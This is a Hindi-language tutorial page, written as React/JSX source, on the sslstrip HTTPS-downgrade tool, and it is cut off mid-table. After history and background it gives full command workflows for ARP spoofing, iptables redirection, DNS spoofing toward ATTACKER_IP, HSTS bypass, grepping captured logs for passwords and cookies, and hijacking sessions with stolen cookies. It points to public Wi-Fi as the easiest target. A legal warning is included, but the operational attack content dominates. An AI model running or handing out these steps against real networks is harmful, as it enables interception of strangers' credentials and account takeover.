import TutorialLayout from '../../components/TutorialLayout'
import CodeBlock from '../../components/CodeBlock'

export default function Sslstrip() {
  return (
    <TutorialLayout
      title="sslstrip"
      subtitle="HTTPS को HTTP में डाउनग्रेड — MITM ट्रैफ़िक इंटरसेप्शन टूल"
      icon="🔒"
      prev={{ to: '/tool/volatility', label: 'volatility' }}
      next={{ to: '/tool/drozer', label: 'drozer' }}
    >
      <h2>What is SSLstrip?</h2>
      <p>
        SSLstrip एक MITM (Man-in-the-Middle) अटैक टूल है जो HTTPS कनेक्शंस को HTTP में डाउनग्रेड करता है। जब कोई यूज़र HTTPS वेबसाइट खोलता है, तो SSLstrip बीच में आकर HTTPS रिक्वेस्ट को HTTP में बदल देता है। इससे यूज़र का सारा डेटा — पासवर्ड, कुकीज़, सेशन टोकन — प्लेन टेक्स्ट में मिल जाता है। यह टूल 2009 में बनाया गया था और आज भी HTTPS डाउनग्रेड अटैक का सबसे अच्छा उदाहरण है। SSLstrip Python2 में लिखा गया है और Twisted async networking framework पर based है।
      </p>
      <p>
        SSLstrip का मूल सिद्धांत यह है कि जब यूज़र किसी HTTP लिंक पर क्लिक करके HTTPS साइट पर जाता है, तो बीच में बैठा अटैकर HTTPS रिक्वेस्ट को इंटरसेप्ट करके खुद रियल सर्वर से HTTPS पर कनेक्ट करता है, लेकिन विक्टिम को HTTP पर रिस्पॉन्स भेजता है। विक्टिम को पता भी नहीं चलता कि उसका कनेक्शन सिक्योर नहीं है — ब्राउज़र में कोई वार्निंग नहीं आती। यह "स्ट्रिपिंग" टेक्निक है जहां HTTPS का "S" हटा दिया जाता है।
      </p>
      <p>
        यह टूल Moxie Marlinspike ने 2009 के Black Hat कॉन्फ़्रेंस में प्रेज़ेंट किया था। इसने HTTPS की सुरक्षा पर गंभीर सवाल उठाए और HSTS (HTTP Strict Transport Security) स्टैंडर्ड के विकास को प्रेरित किया। SSLstrip ने दिखाया कि सिर्फ HTTPS होना काफ़ी नहीं है — ब्राउज़र को भी HTTPS को फ़ोर्स करना चाहिए। इस टॉक ने पूरी इंडस्ट्री को हिला दिया और TLS/SSL के implementation में बड़े बदलाव आए।
      </p>
      <p>
        आज के ब्राउज़र्स में HSTS (HTTP Strict Transport Security) की वजह से SSLstrip की इफ़ेक्टिवनेस कम हो गई है। लेकिन अभी भी बहुत सी वेबसाइट्स HSTS नहीं यूज़ करतीं, और फ़र्स्ट-विज़िट अटैक्स अभी भी पॉसिबल हैं। यह टूल HTTPS डाउनग्रेड अटैक का कॉन्सेप्ट समझने के लिए बहुत ज़रूरी है। पेनेट्रेशन टेस्टर्स के लिए यह ज़रूरी है कि वो इस अटैक को समझें ताकि क्लाइंट को सही डिफेंस बता सकें।
      </p>
      <p>
        SSLstrip सिर्फ एक टूल नहीं है — यह HTTPS डाउनग्रेड अटैक की एक पूरी कैटेगरी का प्रतिनिधित्व करता है। इसके बाद कई और टूल्स आए जो इसी कॉन्सेप्ट पर आधारित हैं — sslstrip2, mitmproxy, Bettercap। लेकिन SSLstrip मूल टूल है जिसने इस अटैक को दुनिया के सामने लाया। आज भी MITM अटैक्स की शुरुआत SSLstrip के कॉन्सेप्ट से ही होती है।
      </p>

      <div className="warning-box mb-6">
        <strong>⚠️ कानूनी चेतावनी:</strong> SSLstrip केवल अधिकृत पेनेट्रेशन टेस्टिंग और सुरक्षा शोध के लिए इस्तेमाल करें। MITM अटैक बिना अनुमति के अवैध हैं। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत अनधिकृत ट्रैफ़िक इंटरसेप्शन गंभीर अपराध है — 3 साल तक की जेल और 5 लाख तक का जुर्माना हो सकता है। केवल अपने लैब वातावरण या लिखित प्राधिकरण के साथ ही उपयोग करें।
      </div>

      <h2>History of SSLstrip</h2>
      <p>
        SSLstrip को Moxie Marlinspike ने 2009 में Black Hat USA कॉन्फ़्रेंस में प्रेज़ेंट किया था। उन्होंने "New Tricks For Defeating SSL In Practice" नाम से टॉक दी थी जिसमें उन्होंने दिखाया कि HTTPS को कैसे बायपास किया जा सकता है। Moxie Marlinspike एक प्रसिद्ध सिक्योरिटी रिसर्चर हैं जिन्होंने Signal मैसेंजर और Whisper Systems भी बनाया है। उन्होंने Convergence नाम का SSL certificate validation system भी बनाया जो CA system का alternative था।
      </p>
      <p>
        इस टॉक ने सिक्योरिटी कम्युनिटी में तहलका मचा दिया। Moxie ने दिखाया कि ज़्यादातर HTTPS इम्प्लीमेंटेशन में एक बड़ी कमज़ोरी है — ब्राउज़र HTTP से HTTPS पर रीडायरेक्ट को बिना वेरिफ़ाइ किए फ़ॉलो करते हैं। इसका मतलब यह है कि अगर अटैकर HTTP रिस्पॉन्स को इंटरसेप्ट कर ले, तो HTTPS रीडायरेक्ट को रोक सकता है। यह basic design flaw था जो HTTPS की पूरी सिक्योरिटी को bypass कर देता था।
      </p>
      <p>
        इस टॉक के बाद IETF ने HSTS (HTTP Strict Transport Security) स्टैंडर्ड (RFC 6797) बनाया जो ब्राउज़र को फ़ोर्स करता है कि वो हमेशा HTTPS पर जाए। लेकिन HSTS की अपनी सीमाएं हैं — फ़र्स्ट-विज़िट अटैक अभी भी पॉसिबल है क्योंकि ब्राउज़र के पास HSTS कैश में डोमेन नहीं होता। इस समस्या को हल करने के लिए HSTS Preload List बनाई गई जो ब्राउज़र में hardcoded होती है।
      </p>
      <p>
        Moxie ने बाद में sslstrip2 भी बनाया जो HSTS को बायपास करने की कोशिश करता है। sslstrip2 + dns2proxy कॉम्बो DNS रिज़ॉल्यूशन में हेरफेर करके HSTS बायपास करता है। यह टेक्निक "Cookie Injection" कहलाती है — ब्राउज़र को लगता है कि डोमेन पहले से HSTS है, इसलिए वो सीधे HTTP पर जाता है। यह advanced technique केवल non-preloaded domains पर काम करती है।
      </p>
      <p>
        आज SSLstrip सीधे तौर पर ज़्यादा इस्तेमाल नहीं होता क्योंकि Bettercap और mitmproxy जैसे मॉडर्न टूल्स में यह फ़ीचर बिल्ट-इन है। लेकिन इसका कॉन्सेप्ट अभी भी रिलेवेंट है — HTTPS डाउनग्रेड अटैक को समझने के लिए SSLstrip सीखना ज़रूरी है। हर पेनेट्रेशन टेस्टर को यह tool ज़रूर try करना चाहिए ताकि HTTPS की limitations समझ में आएं।
      </p>
      <p>
        SSLstrip ने HTTPS ecosystem में बड़े बदलाव लाए। इसके अलावा Moxie ने और भी कई महत्वपूर्ण काम किए — उन्होंने SSL/TLS की कई कमज़ोरियां ढूंढीं और Certificate Transparency के विकास में योगदान दिया। SSLstrip की legacy यह है कि इसने दिखाया कि encryption alone sufficient नहीं है — authentication भी ज़रूरी है। यह lesson आज भी उतना ही relevant है।
      </p>
      <p>
        2011 में Black Hat Europe में Marlinspike ने "SSL And The Future Of Authenticity" नाम से एक और टॉक दी जिसमें उन्होंने CA (Certificate Authority) system की कमज़ोरियां दिखाईं। उन्होंने दिखाया कि कैसे कोई भी CA किसी भी डोमेन के लिए सर्टिफ़िकेट जारी कर सकता है। इससे DigiNotar जैसे बड़े breach सामने आए और Certificate Transparency की ज़रूरत महसूस हुई।
      </p>

      <h2>How SSLstrip Works?</h2>
      <p>
        SSLstrip का काम HTTPS कनेक्शन को HTTP में डाउनग्रेड करना है। यह MITM पोज़िशन में बैठकर दोनों तरफ़ के कम्युनिकेशन को मैनेज करता है। यह टूल बहुत सिंपल लेकिन पावरफुल कॉन्सेप्ट पर काम करता है — विक्टिम से HTTP पर बात करो, रियल सर्वर से HTTPS पर बात करो, और बीच में डेटा कैप्चर करो। इस process में कई steps involved हैं जो नीचे detail में explain किए गए हैं।
      </p>
      <div className="space-y-3 mt-4">
        {[
          { step: '1', title: 'MITM पोज़िशन बनाओ', desc: 'ARP स्पूफ़िंग से विक्टिम और राउटर के बीच में आओ। विक्टिम का सारा ट्रैफ़िक अपने मशीन से होकर गुज़रे — यह ज़रूरी है। बिना MITM के SSLstrip काम नहीं करेगा क्योंकि traffic आपके पास आएगा ही नहीं।' },
          { step: '2', title: 'HTTP ट्रैफ़िक इंटरसेप्ट', desc: 'iptables से पोर्ट 80 का ट्रैफ़िक SSLstrip के पोर्ट पर रीडायरेक्ट करो। विक्टिम की HTTP रिक्वेस्ट SSLstrip को मिलती है। यह NAT table में PREROUTING rule add करके होता है।' },
          { step: '3', title: 'HTTPS इंटरसेप्ट', desc: 'जब विक्टिम HTTPS साइट खोलेगा, SSLstrip रिक्वेस्ट इंटरसेप्ट करेगा। रियल सर्वर से HTTPS पर कनेक्ट करेगा। SSLstrip अपने आप SSL/TLS handshake handle करता है।' },
          { step: '4', title: 'HTTP डाउनग्रेड', desc: 'SSLstrip रियल HTTPS से रिस्पॉन्स लेकर विक्टिम को HTTP पर भेजेगा। URL में https:// को http:// से रिप्लेस करेगा। सभी absolute URLs भी rewrite होंगे।' },
          { step: '5', title: 'लिंक रिराइटिंग', desc: 'पेज के अंदर सभी HTTPS लिंक्स को HTTP में बदल देगा ताकि विक्टिम HTTPS पर वापस न जाए। href, action, src सभी attributes rewrite होते हैं।' },
          { step: '6', title: 'फ़ेविकॉन स्पूफ़िंग', desc: 'लॉक आइकन वाला फ़ेविकॉन सेट करेगा ताकि विक्टिम को लगे कि कनेक्शन सिक्योर है। यह visual deception technique है जो users को भरमाती है।' },
          { step: '7', title: 'डेटा कैप्चर', desc: 'विक्टिम का सारा डेटा प्लेन टेक्स्ट में — पासवर्ड, कुकीज़, सेशन टोकन, credit card numbers सब। POST data और response headers दोनों capture होते हैं।' },
          { step: '8', title: 'लॉगिंग', desc: 'सभी कैप्चर्ड डेटा को लॉग फ़ाइल में सेव करेगा। बाद में एनालिसिस कर सकते हो। Timestamp, URL, POST data, cookies सब log में आते हैं।' },
        ].map(item => (
          <div key={item.step} className="flex items-start space-x-4 glass-card p-4">
            <div className="flex-shrink-0 w-10 h-10 bg-neon-green/10 border border-neon-green/30 rounded-full flex items-center justify-center text-neon-green font-heading font-bold">
              {item.step}
            </div>
            <div>
              <h4 className="text-white font-mono font-semibold">{item.title}</h4>
              <p className="text-gray-500 text-sm">{item.desc}</p>
            </div>
          </div>
        ))}
      </div>

      <h2 className="mt-8">Installation</h2>
      <p>
        SSLstrip Python 2 पर चलता है। यह एक पुराना टूल है (2009) इसलिए Python 3 सपोर्ट नहीं है। काली लिनक्स में प्री-इंस्टॉल्ड हो सकता है। ध्यान रखें कि Python 2 end-of-life हो चुका है (2020), इसलिए installation में issues आ सकते हैं।
      </p>
      <CodeBlock
        title="SSLstrip इंस्टॉलेशन"
        code={`# pip से इंस्टॉल:
pip install sslstrip

# या pip2 से (Python2):
pip2 install sslstrip

# सोर्स से:
git clone https://github.com/moxie0/sslstrip.git
cd sslstrip
sudo python2 setup.py install

# काली लिनक्स में:
sudo apt update
sudo apt install sslstrip

# वर्जन चेक:
sslstrip --help

# Python2 की ज़रूरत है — Python3 में काम नहीं करता
# अगर Python2 नहीं है:
sudo apt install python2 python2-dev

# dependencies:
sudo apt install python-twisted python-openssl python-setuptools

# pyenv से Python 2.7 install करो (अगर system में नहीं है):
curl https://pyenv.run | bash
pyenv install 2.7.18
pyenv global 2.7.18`}
      />

      <h2>Basic Usage</h2>
      <p>
        SSLstrip चलाने से पहले MITM सेटअप करना पड़ता है — IP फ़ॉरवर्डिंग, iptables रूल्स, और ARP स्पूफ़िंग। यह तीनों स्टेप्स ज़रूरी हैं — कोई भी मिस हो तो अटैक काम नहीं करेगा। हर स्टेप का अलग purpose है और सभी को सही sequence में करना ज़रूरी है।
      </p>
      <CodeBlock
        title="SSLstrip अटैक सेटअप"
        code={`# स्टेप 1: IP फ़ॉरवर्डिंग इनेबल करें:
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
# यह ज़रूरी है — बिना इसके विक्टिम का नेट बंद हो जाएगा

# स्टेप 2: iptables से ट्रैफ़िक रीडायरेक्ट:
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
# पोर्ट 80 (HTTP) का ट्रैफ़िक SSLstrip के पोर्ट 8080 पर जाएगा

# स्टेप 3: ARP स्पूफ़िंग (अलग टर्मिनल में):
sudo arpspoof -i wlan0 -t VICTIM_IP ROUTER_IP
sudo arpspoof -i wlan0 -t ROUTER_IP VICTIM_IP

# स्टेप 4: SSLstrip स्टार्ट:
sslstrip -l 8080

# अब विक्टिम का HTTP ट्रैफ़िक कैप्चर होगा!
# HTTPS रिक्वेस्ट्स HTTP में कन्वर्ट हो जाएंगे`}
      />

      <h2>Important Options</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Flag</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">उदाहरण</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-l PORT</td><td className="py-2 px-3">लिसनिंग पोर्ट सेट करें (डिफ़ॉल्ट 8080)</td><td className="py-2 px-3 font-mono text-xs">-l 8080</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-w FILE</td><td className="py-2 px-3">लॉग फ़ाइल में सेव करें</td><td className="py-2 px-3 font-mono text-xs">-w capture.log</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-p</td><td className="py-2 px-3">प्रीकम्यूटेड SSLstrip (प्रॉक्सी मोड)</td><td className="py-2 px-3 font-mono text-xs">-p</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-s STRING</td><td className="py-2 px-3">स्क्रिप्ट इंजेक्शन (HTML में कोड डालो)</td><td className="py-2 px-3 font-mono text-xs">-s "&lt;script&gt;...&lt;/script&gt;"</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-f</td><td className="py-2 px-3">फ़ेविकॉन स्पूफ़ (लॉक आइकन दिखाओ)</td><td className="py-2 px-3 font-mono text-xs">-f</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-k</td><td className="py-2 px-3">HTTPS कनेक्शंस किल करें</td><td className="py-2 px-3 font-mono text-xs">-k</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-a</td><td className="py-2 px-3">सभी ट्रैफ़िक कैप्चर करें (सिर्फ POST नहीं)</td><td className="py-2 px-3 font-mono text-xs">-a</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-t</td><td className="py-2 px-3">टाइमस्टैम्प लॉग में डालें</td><td className="py-2 px-3 font-mono text-xs">-t</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-q</td><td className="py-2 px-3">क्वाइट मोड (कम आउटपुट)</td><td className="py-2 px-3 font-mono text-xs">-q</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--help</td><td className="py-2 px-3">सभी ऑप्शंस देखें</td><td className="py-2 px-3 font-mono text-xs">--help</td></tr>
          </tbody>
        </table>
      </div>

      <h2>ARP Spoofing Setup</h2>
      <p>
        SSLstrip को MITM पोज़िशन चाहिए। ARP स्पूफ़िंग से विक्टिम का ट्रैफ़िक अपने मशीन से होकर गुज़रता है। बिना MITM के SSLstrip काम नहीं करेगा क्योंकि ट्रैफ़िक आपके पास आएगा ही नहीं। ARP spoofing Layer 2 attack है जो local network पर काम करता है।
      </p>
      <CodeBlock
        title="ARP स्पूफ़िंग (arpspoof)"
        code={`# arpspoof से MITM:
# टर्मिनल 1: विक्टिम को बताओ कि मैं राउटर हूं:
sudo arpspoof -i wlan0 -t 192.168.1.100 192.168.1.1

# टर्मिनल 2: राउटर को बताओ कि मैं विक्टिम हूं:
sudo arpspoof -i wlan0 -t 192.168.1.1 192.168.1.100

# Ettercap से भी कर सकते हो:
sudo ettercap -T -i wlan0 -M arp:remote /192.168.1.100/ /192.168.1.1/

# Bettercap से (सबसे आसान):
sudo bettercap -iface wlan0
# > set arp.spoof.targets 192.168.1.100
# > arp.spoof on

# वेरिफ़ाई करो कि MITM काम कर रहा है:
# विक्टिम मशीन पर:
# arp -a — अटैकर का MAC दिखना चाहिए राउटर की जगह`}
      />

      <h2>SSLstrip Attack Step-by-Step</h2>
      <p>
        पूरा अटैक वर्कफ़्लो स्टेप-बाय-स्टेप — शुरू से अंत तक। यह complete workflow है जो real-world scenario में use होता है। हर step critical है — कोई skip करोगे तो attack fail हो जाएगा।
      </p>
      <CodeBlock
        title="कंप्लीट अटैक वर्कफ़्लो"
        code={`# टर्मिनल 1 — IP फ़ॉरवर्डिंग:
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# टर्मिनल 2 — iptables:
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080

# टर्मिनल 3 — ARP स्पूफ़िंग:
sudo arpspoof -i wlan0 -t 192.168.1.100 192.168.1.1

# टर्मिनल 4 — ARP स्पूफ़िंग (रिवर्स):
sudo arpspoof -i wlan0 -t 192.168.1.1 192.168.1.100

# टर्मिनल 5 — SSLstrip:
sslstrip -l 8080 -w capture.log -f

# टर्मिनल 6 — लॉग मॉनिटर:
tail -f capture.log

# विक्टिम को बोलो किसी HTTP साइट पर जाए
# जैसे ही वो HTTPS साइट खोलेगा, SSLstrip:
# 1. HTTPS रिक्वेस्ट इंटरसेप्ट करेगा
# 2. रियल साइट से HTTPS पर कनेक्ट करेगा
# 3. विक्टिम को HTTP पर रिस्पॉन्स देगा
# 4. पासवर्ड और कुकीज़ लॉग में सेव होंगे

# लॉग चेक करें:
cat capture.log | grep -i password
cat capture.log | grep -i cookie`}
      />

      <h2>SSLstrip Internal Working</h2>
      <p>
        SSLstrip कैसे internally काम करता है — यह समझना ज़रूरी है ताकि custom modifications और troubleshooting कर सको। SSLstrip Python2 में लिखा गया है और Twisted framework use करता है।
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">Twisted Framework:</strong> SSLstrip Python की Twisted library पर based है। यह asynchronous networking framework है जो हज़ारों connections handle कर सकता है। Event-driven architecture use करता है।</li>
        <li><strong className="text-white">HTTP Proxy Server:</strong> SSLstrip एक HTTP proxy server चलाता है जो port 8080 पर listen करता है। सभी HTTP requests इस proxy से होकर गुज़रती हैं।</li>
        <li><strong className="text-white">HTTPS Connection Handler:</strong> जब HTTPS request आती है, SSLstrip खुद real server से HTTPS connection establish करता है। SSL/TLS handshake internally handle होता है।</li>
        <li><strong className="text-white">Response Rewriter:</strong> Real server का HTTPS response लेकर सभी https:// URLs को http:// में बदलता है। href, action, src, form action सभी attributes rewrite होते हैं।</li>
        <li><strong className="text-white">Favicon Spoofing:</strong> -f flag से SSLstrip lock icon वाला favicon inject करता है। यह visual deception है जो users को भरमाता है।</li>
        <li><strong className="text-white">POST Data Capture:</strong> Form submissions (login forms) का POST data capture होता है। Username, password, email सब plain text में log होते हैं।</li>
        <li><strong className="text-white">Cookie Interception:</strong> Set-Cookie headers capture होती हैं। Session cookies, auth tokens सब मिल जाते हैं।</li>
        <li><strong className="text-white">Logging System:</strong> सभी captured data timestamp के साथ log file में save होता है। -w flag से log file specify कर सकते हो।</li>
      </ul>
      <p>
        SSLstrip का source code बहुत clean और readable है। अगर Python2 environment है तो source code पढ़ो — twisted प्रोग्रामिंग सीखने का अच्छा उदाहरण है। core.py और sslstrip.py main files हैं।
      </p>
      <p>
        SSLstrip की limitation यह है कि यह सिर्फ HTTP port 80 पर काम करता है। HTTPS port 443 के लिए अलग setup चाहिए। और यह single-threaded है — बहुत ज़्यादा traffic पर performance degrade हो सकती है।
      </p>

      <h2>SSLstrip with DNS Spoofing</h2>
      <p>
        SSLstrip को DNS spoofing के साथ मिलाकर और powerful attack बनाता है — victim को fake DNS response से attacker के proxy पर redirect करो।
      </p>
      <CodeBlock
        title="DNS स्पूफ़ + SSLstrip"
        code={`# Ettercap DNS स्पूफ़िंग:

# स्टेप 1: DNS स्पूफ़ plugin configure करो:
sudo nano /etc/ettercap/etter.dns
# एड करो:
# target.com A ATTACKER_IP
# *.target.com A ATTACKER_IP

# स्टेप 2: Ettercap शुरू करो:
sudo ettercap -T -i wlan0 -P dns_spoof -M arp:remote /192.168.1.100/ /192.168.1.1/

# स्टेप 3: SSLstrip शुरू करो:
sslstrip -l 8080 -w capture.log -f

# अब victim target.com खोलेगा तो:
# 1. DNS query attacker को जाएगी (ARP spoof)
# 2. Attacker fake DNS response देगा
# 3. Victim attacker के proxy पर जाएगा
# 4. SSLstrip HTTPS strip करेगा
# 5. Credentials capture होंगे

# Bettercap से (सब एक साथ):
sudo bettercap -iface wlan0
# > set arp.spoof.targets 192.168.1.100
# > set dns.spoof.domains target.com
# > set http.proxy.sslstrip true
# > http.proxy on
# > arp.spoof on
# > dns.spoof on`}
      />

      <h2>SSLstrip on Different Networks</h2>
      <p>
        SSLstrip अलग-अलग network environments में अलग तरीके से काम करता है। हर network type की अपनी limitations हैं।
      </p>
      <CodeBlock
        title="नेटवर्क-स्पेसिफ़िक सेटअप"
        code={`# WiFi Network (सबसे आम):
# ARP spoofing + SSLstrip — classic combo
# सभी devices same subnet पर होने चाहिए
sudo arpspoof -i wlan0 -t VICTIM ROUTER

# Ethernet Network:
# Same technique, different interface
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# Public WiFi (Coffee Shop, Airport):
# Open network — कोई encryption नहीं
# सबसे आसान target — users HTTP पर हैं
# कोई ARP protection usually नहीं होता

# Corporate Network (मुश्किल):
# 802.1X authentication — port security
# ARP inspection enabled हो सकता है
# IDS/IPS detect कर सकता है
# Bettercap stealth mode try करो

# Virtual Network (Lab):
# VirtualBox Host-Only network
# दो VMs — attacker और victim
# Safe environment for practice

# Mobile Hotspot:
# Limited — usually 1-10 devices
# ARP spoofing works but limited range
# Good for targeted testing`}
      />

      <h2>HSTS Bypass Techniques</h2>
      <p>
        HSTS (HTTP Strict Transport Security) SSLstrip को ब्लॉक करता है। लेकिन कुछ बायपास टेक्निक्स हैं जो अभी भी काम कर सकती हैं। HSTS ब्राउज़र को फ़ोर्स करता है कि वो हमेशा HTTPS पर जाए — लेकिन इसमें कुछ कमज़ोरियां हैं। HSTS की effectiveness domain-level है — अगर includeSubDomains set नहीं है तो subdomains vulnerable रहते हैं। HSTS header में max-age directive बताता है कि कितने समय तक HTTPS enforce रहेगा।
      </p>
      <p>
        HSTS Preload List सबसे strong defense है — ब्राउज़र में hardcoded domains list होती है जो हमेशा HTTPS use करती हैं। लेकिन यह list manually maintain करनी पड़ती है और new domains add होने में समय लगता है। इसलिए non-preloaded domains अभी भी vulnerable हैं। HSTS preload list में लाखों domains हैं लेकिन internet पर करोड़ों websites हैं — ज़्यादातर HSTS preload में नहीं हैं।
      </p>
      <CodeBlock
        title="HSTS बायपास"
        code={`# HSTS कैसे काम करता है:
# ब्राउज़र HSTS हेडर स्टोर करता है
# अगर साइट ने HSTS भेजा है तो ब्राउज़र हमेशा HTTPS पर जाएगा
# max-age डायरेक्टिव बताता है कि कितने समय तक HTTPS फ़ोर्स रहेगा

# बायपास टेक्निक 1: फ़र्स्ट-विज़िट अटैक
# अगर यूज़र ने पहले कभी साइट नहीं खोली तो HSTS कैश में नहीं है
# इसलिए फ़र्स्ट-विज़िट पर SSLstrip काम करता है
# HSTS preload list में न होने वाली साइट्स वल्नरेबल हैं

# बायपास टेक्निक 2: सबडोमेन अटैक
# HSTS सिर्फ स्पेसिफ़िक डोमेन के लिए है
# अगर example.com HSTS है तो sub.example.com नहीं हो सकता
# includeSubDomains डायरेक्टिव न हो तो सबडोमेन से अटैक करो

# बायपास टेक्निक 3: SSLstrip2 + dns2proxy
git clone https://github.com/LeonardoNve/sslstrip2.git
git clone https://github.com/LeonardoNve/dns2proxy.git

# sslstrip2 चलाओ:
python sslstrip2.py -l 8080

# dns2proxy चलाओ (अलग टर्मिनल):
python dns2proxy.py

# यह DNS रिज़ॉल्यूशन में हेरफेर करके HSTS बायपास करता है
# "Cookie Injection" टेक्निक यूज़ करता है`}
      />

      <h2>Cookie Hijacking</h2>
      <p>
        SSLstrip से सेशन कुकीज़ कैप्चर करके सेशन हाईजैक कर सकते हो। यह सबसे ख़तरनाक अटैक है — बिना पासवर्ड के भी अकाउंट एक्सेस मिल जाता है। Session cookies HTTP header में transmit होते हैं और SSLstrip इन्हें plain text में capture कर लेता है।
      </p>
      <CodeBlock
        title="कुकीज़ कैप्चर"
        code={`# SSLstrip का लॉग फ़ाइल चेक करें:
cat capture.log

# कुकीज़ निकालें:
grep -i "cookie" capture.log

# सेशन टोकन मिल जाएगा
# ब्राउज़र में कुकी सेट करके सेशन हाईजैक करो

# Wireshark में भी देख सकते हो (HTTP ट्रैफ़िक):
# फ़िल्टर: http.request.method == POST
# POST डेटा में पासवर्ड और कुकीज़ मिलेंगे

# Burp Suite में कुकी सेट करो:
# Proxy → Options → Match and Replace
# Cookie हेडर रिप्लेस करो कैप्चर्ड कुकी से

# curl से कुकी यूज़ करो:
curl -b "session_id=CAPTURED_COOKIE" https://target.com/dashboard`}
      />

      <h2>Session Hijacking</h2>
      <p>
        सेशन हाईजैक SSLstrip का सबसे पावरफुल अप्लीकेशन है — विक्टिम का सेशन टोकन कैप्चर करके उसकी तरह ब्राउज़ करो। यह attack इसलिए dangerous है क्योंकि victim को पता भी नहीं चलता कि उसका session compromised है। Two-factor authentication भी इससे बचा नहीं सकता अगर session token leak हो गया।
      </p>
      <CodeBlock
        title="सेशन हाईजैक"
        code={`# स्टेप 1: SSLstrip से कुकीज़ कैप्चर करो
cat capture.log | grep -i "set-cookie"

# स्टेप 2: सेशन कुकी निकालो
# उदाहरण: session_id=abc123; path=/

# स्टेप 3: ब्राउज़र में कुकी सेट करो
# Firefox: Developer Tools → Storage → Cookies
# Chrome: Developer Tools → Application → Cookies

# स्टेप 4: वेबसाइट रिफ़्रेश करो
# विक्टिम का अकाउंट ओपन हो जाएगा!

# स्टेप 5: अकाउंट एक्सेस
# अब विक्टिम की तरह ब्राउज़ कर सकते हो
# प्रोफ़ाइल, डेटा, सब कुछ एक्सेस`}
      />

      <h2>Combined Attack — ARP + SSLstrip + Bettercap</h2>
      <p>
        SSLstrip को Bettercap के साथ मिलाकर ज़्यादा पावरफुल अटैक कर सकते हो। Bettercap ARP स्पूफ़िंग और SSLstrip दोनों करता है — एक ही टूल में। यह modern approach है जो अलग-अलग tools को separately चलाने से बेहतर है।
      </p>
      <CodeBlock
        title="Bettercap + SSLstrip"
        code={`# Bettercap से सब कुछ एक साथ:
sudo bettercap -iface wlan0

# Bettercap कमांड्स:
# > set arp.spoof.targets 192.168.1.100
# > set http.proxy.sslstrip true
# > http.proxy on
# > arp.spoof on

# यह ऑटोमैटिकली:
# 1. ARP स्पूफ़िंग करेगा
# 2. HTTP प्रॉक्सी सेट करेगा
# 3. SSLstrip अप्लाई करेगा
# 4. डेटा कैप्चर करेगा

# Ettercap + SSLstrip:
sudo ettercap -T -i wlan0 -M arp:remote -P sslstrip /192.168.1.100/ /192.168.1.1/`}
      />

      <h2>SSLstrip vs mitmproxy vs Bettercap</h2>
      <p>
        HTTPS interception के लिए कई टूल्स उपलब्ध हैं। हर टूल की अपनी strength और weakness है। सही टूल चुनना ज़रूरी है।
      </p>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">फ़ीचर</th>
              <th className="text-left py-2 px-3 text-neon-green">SSLstrip</th>
              <th className="text-left py-2 px-3 text-neon-green">mitmproxy</th>
              <th className="text-left py-2 px-3 text-neon-green">Bettercap</th>
              <th className="text-left py-2 px-3 text-neon-green">sslstrip2</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">HTTPS→HTTP</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">HSTS बायपास</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">लिमिटेड</td><td className="py-2 px-3">हाँ (dns2proxy)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">ARP स्पूफ़िंग</td><td className="py-2 px-3">अलग से</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">बिल्ट-इन</td><td className="py-2 px-3">अलग से</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">स्क्रिप्टिंग</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">Python addons</td><td className="py-2 px-3">JavaScript caplets</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">GUI</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">वेब UI</td><td className="py-2 px-3">वेब UI</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Python3</td><td className="py-2 px-3">नहीं (Python2)</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">Go (Python नहीं)</td><td className="py-2 px-3">नहीं (Python2)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">WiFi अटैक्स</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">हाँ (deauth, etc.)</td><td className="py-2 px-3">नहीं</td></tr>
